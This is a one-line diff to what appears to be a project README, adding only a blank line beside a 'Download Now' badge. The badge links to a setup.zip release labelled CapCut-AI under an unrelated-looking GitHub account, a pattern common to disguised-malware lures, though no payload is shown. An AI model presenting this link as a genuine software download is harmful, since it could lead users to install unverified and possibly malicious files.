@@ -11,6 +11,7 @@
 
 [![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/SquareShipwrightKind/CapCut-AI/releases/download/setup/setup.zip)
 
+
 </div>
 
 ---
